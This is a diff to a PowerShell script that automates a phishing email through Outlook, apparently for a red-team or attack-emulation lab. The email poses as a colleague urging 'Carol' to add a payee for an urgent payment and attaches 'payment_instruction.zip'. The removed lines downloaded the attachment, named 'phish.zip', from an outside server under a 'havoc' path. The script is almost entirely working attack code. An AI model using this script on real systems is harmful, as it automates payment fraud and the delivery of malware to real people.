@@ -1,10 +1,3 @@
-# Define the URL of the hosted file and the local path to save it
-$attachmentUrl = "http://198.18.128.188:8000/havoc/phish.zip"
-$localAttachmentPath = "C:\Users\Public\payment_instruction.zip"
-
-# Download the file from the HTTP server
-Invoke-WebRequest -Uri $attachmentUrl -OutFile $localAttachmentPath
-
 # Create an Outlook application object
 $Outlook = New-Object -ComObject Outlook.Application
 
@@ -16,8 +9,11 @@ $mail.Subject = "Need this Payee added ASAP"
 $mail.Body = "Hi Carol,`n`nI will be out of office tomorrow, please add payee asap as we need to get the payment settled.`n`nBye,`nGrady."
 $mail.To = "cdanvers@pseudo-ai.com"
 
+# Define the attachment path
+$attachmentPath = Join-Path -Path $env:temp -ChildPath "payment_instruction.zip"
+
 # Add the local attachment (the downloaded zip file) to the email
-$mail.Attachments.Add($localAttachmentPath)
+$mail.Attachments.Add($attachmentPath)
 
 # Send the email
 $mail.Send()
